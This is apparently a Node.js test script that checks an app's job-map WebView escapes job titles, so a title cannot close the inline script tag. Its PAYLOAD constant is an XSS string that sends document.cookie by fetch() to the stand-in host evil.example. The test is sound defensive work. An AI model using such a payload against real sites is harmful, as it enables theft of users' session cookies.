// Proves the job-map WebView cannot be broken out of by a hostile job title.
//
// Run:  node tradiee-mobile/scripts/check-map-escaping.mjs
//
// The map WebView renders `var pts = <json>;` inside an inline <script>.
// JSON.stringify does not escape `<`, so before the fix a job title containing
// `</script>` closed the tag and the rest of the title became live markup.
// Job titles are not trusted: other company members write them, and the public
// booking widget lets anonymous visitors supply them.

import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { dirname, join } from 'node:path'

const here = dirname(fileURLToPath(import.meta.url))
const source = readFileSync(join(here, '..', 'app', 'job-map.tsx'), 'utf8')

// Lift the shipped helper out of the screen rather than re-typing it, so this
// check tracks the real implementation instead of a copy that can drift.
const body = source.match(/function escapeForScriptTag\(json: string\) \{\r?\n([\s\S]*?)\r?\n\}/)
assert.ok(body, 'escapeForScriptTag not found in app/job-map.tsx')
const escapeForScriptTag = new Function('json', body[1])

const PAYLOAD = '</script><script>fetch("https://evil.example/"+document.cookie)</script>'
const jobs = [{ lat: -41.29, lng: 174.78, label: `1. JOB-001 — ${PAYLOAD}` }]

// ── Vulnerable form: what the screen did before the fix ─────────────────────
const unsafe = JSON.stringify(jobs)
assert.ok(
  unsafe.includes('</script>'),
  'baseline broken: raw JSON.stringify should still contain a literal </script>'
)

// ── Fixed form ──────────────────────────────────────────────────────────────
const safe = escapeForScriptTag(unsafe)
for (const ch of ['<', '>', '&', String.fromCharCode(0x2028), String.fromCharCode(0x2029)]) {
  assert.ok(!safe.includes(ch), `escaped output still contains a raw ${JSON.stringify(ch)}`)
}

// ── The escape must be lossless — the pin still shows the real title ────────
assert.deepEqual(
  JSON.parse(safe),
  jobs,
  'escaping changed the parsed value; map labels would render mangled'
)

// ── And it must survive being embedded in the actual script tag ─────────────
// A regex stand-in for "does the HTML parser see the script end early".
const html = `<script>\n  var pts = ${safe};\n</script>`
assert.equal(
  html.split('</script>').length - 1,
  1,
  'more than one </script> in the emitted HTML — the tag can still be closed early'
)

console.log('OK — job-map WebView payload is escaped, lossless, and break-out safe.')
